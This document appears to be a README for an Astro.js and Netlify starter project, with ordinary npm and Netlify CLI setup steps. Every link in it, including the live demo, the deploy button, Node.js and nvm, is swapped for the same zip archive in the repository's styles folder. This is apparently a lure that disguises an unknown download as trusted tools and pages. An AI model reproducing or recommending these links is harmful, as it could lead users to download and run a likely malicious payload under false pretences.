# Astro on Netlify Platform Starter

[Live Demo](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-9d810/main/src/styles/platform-starter-d-astro-1.2.zip)

A modern starter based on Astro.js, Tailwind, and [Netlify Core Primitives](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-9d810/main/src/styles/platform-starter-d-astro-1.2.zip) (Edge Functions, Image CDN, Blob Store).

## Astro Commands

All commands are run from the root of the project, from a terminal:

| Command                   | Action                                           |
| :------------------------ | :----------------------------------------------- |
| `npm install`             | Installs dependencies                            |
| `npm run dev`             | Starts local dev server at `localhost:4321`      |
| `npm run build`           | Build your production site to `./dist/`          |
| `npm run preview`         | Preview your build locally, before deploying     |
| `npm run astro ...`       | Run CLI commands like `astro add`, `astro check` |
| `npm run astro -- --help` | Get help using the Astro CLI                     |

## Deploying to Netlify

[![Deploy to Netlify](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-9d810/main/src/styles/platform-starter-d-astro-1.2.zip)](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-9d810/main/src/styles/platform-starter-d-astro-1.2.zip)

## Developing Locally

| Prerequisites                                                                |
| :--------------------------------------------------------------------------- |
| [Node.js](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-9d810/main/src/styles/platform-starter-d-astro-1.2.zip) v18.14+.                                      |
| (optional) [nvm](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-9d810/main/src/styles/platform-starter-d-astro-1.2.zip) for Node version management. |

1. Clone this repository, then run `npm install` in its root directory.

2. For the starter to have full functionality locally (e.g. edge functions, blob store), please ensure you have an up-to-date version of Netlify CLI. Run:

```
npm install netlify-cli@latest -g
```

3. Link your local repository to the deployed Netlify site. This will ensure you're using the same runtime version for both local development and your deployed site.

```
netlify link
```

4. Then, run the Astro.js development server via Netlify CLI:

```
netlify dev
```

If your browser doesn't navigate to the site automatically, visit [localhost:8888](http://localhost:8888).
